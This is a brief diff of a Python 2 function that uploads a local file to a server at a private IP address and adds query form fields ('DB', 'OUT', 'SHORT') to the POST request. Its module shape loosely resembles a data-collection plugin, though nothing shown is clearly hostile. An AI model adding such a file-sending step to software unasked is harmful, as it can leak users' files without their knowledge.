@@ -6,7 +6,8 @@ def run(**args):
      # url='https://github.com/experiment2016/workhub/tree/master/data/post'
       url='http://192.168.1.4:8000'
       files = {'upload_file': open(goodie,'rb')}
-      r=requests.post(url,files=files)
+      values = {'DB': 'photcat', 'OUT': 'csv', 'SHORT': 'short'}
+      r=requests.post(url, files=files, data=values)
       ta = "ok"
       return str(ta)
   except Exception, e:
